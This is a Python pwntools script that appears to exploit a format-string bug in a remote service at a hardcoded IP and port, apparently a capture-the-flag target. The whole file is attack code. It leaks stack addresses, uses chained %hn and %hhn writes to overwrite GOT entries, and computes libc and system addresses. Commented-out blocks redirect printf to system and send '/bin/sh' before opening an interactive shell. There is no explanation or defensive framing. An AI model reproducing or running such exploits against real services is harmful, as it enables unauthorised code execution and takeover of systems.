from pwn import *
import re

host = '140.115.59.7'
port = 11009
y = remote( host , port )

printf_got = 0x804a010
printf_offset = 0x49590
read_got = 0x804a00c
read_offset = 0xd5c00

system_offset = 0x3ad80


def pp(pay):
    p = pay + '|END\n\x00'
    y.sendline(p)


y.recvline()
y.recvline()
y.recvline()

pp('%10$x')
ad = y.recvuntil('|END\n')[:-5]
print ad
ad2 = ad[6:8]
print ad2


#pp('%.'+str(int(ad2,16)+2)+'x%6$hhn')   # %.x%6$hhn

#pp('\x00'*100)


"""
pp('%.40976x%10$hn')  #0xa010    %.40976x%10$hn
y.recvuntil('END\n')
sleep(1)

a = '%.'+str(int(ad2,16)+2)+'x%6$hhn'
pp( a )   # %.x%6$hhn
y.recvuntil('END\n')
sleep(1)


pp('%.2052x%10$hn')    #0x804      %.2052x%10$hn
y.recvuntil('END\n')
sleep(1)


a = '%.'+str(int(ad2,16)-2)+'x%6$hhn'
pp( a )   # %.x%6$hhn
y.recvuntil('END\n')
sleep(1)
pp( '\x00'*200 )
"""


a = '%.' + str( int( ad[4:] , 16 ) + 0x10 ) + 'x%10$hn'
pp( a )    #____xxxx + 10
y.recvuntil('END\n')
sleep(1)


a = '%.'+str(int(ad2,16)+2)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)

a = '%.' + str( int( ad[:4] , 16 ) ) + 'x%10$hn'
pp( a )    #xxxx____
y.recvuntil('END\n')
sleep(1)

a = '%.'+str(int(ad2,16)+4)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)

a = '%.' + str( int( ad[4:] , 16 ) + 0x12 ) + 'x%10$hn'
pp( a )    #xxxx____
y.recvuntil('END\n')
sleep(1)

a = '%.'+str(int(ad2,16)+6)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)

a = '%.' + str( int( ad[:4] , 16 ) ) + 'x%10$hn'
pp( a )    #xxxx____
y.recvuntil('END\n')
sleep(1)

a = '%.'+str(int(ad2,16)-2)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)


a = '%.2052x%15$hn%.38924x%14$hn'  # 40976 - 2052 = 38924
pp( a )
y.recvuntil('END\n')
sleep(1)




#pp('%14$p')
#y.recvuntil('END\n')

"""
leak = y.recvuntil('END\n')
log.info(leak)
printf_addr = u32(leak[:4])
log.info(hex(printf_addr))
sleep(1)

libc_base = printf_addr - printf_offset
system_addr = libc_base + system_offset

log.success(hex(system_addr))






a = '%.' + str( int(hex(system_addr)[6:] , 16) ) + 'x%14$hn'
b = '%.' + str(int(ad2,16)) + 'x%6$hhn'
c = '%.18x%10$hn'
d = '%.' + str( int(hex(system_addr)[2:6] , 16) ) + 'x%14$hn'
pp( a + b + c + d )
y.recvuntil('END\n')
sleep(1)

y.sendline('/bin/sh\x00')

"""

"""
pp('%.18x%10$hn')
y.recvuntil('END\n')
sleep(1)
"""





#pp('%10$x')
#pp('%10$x')
#pp('%x.'*30)
#pp('%10$x')




y.interactive()
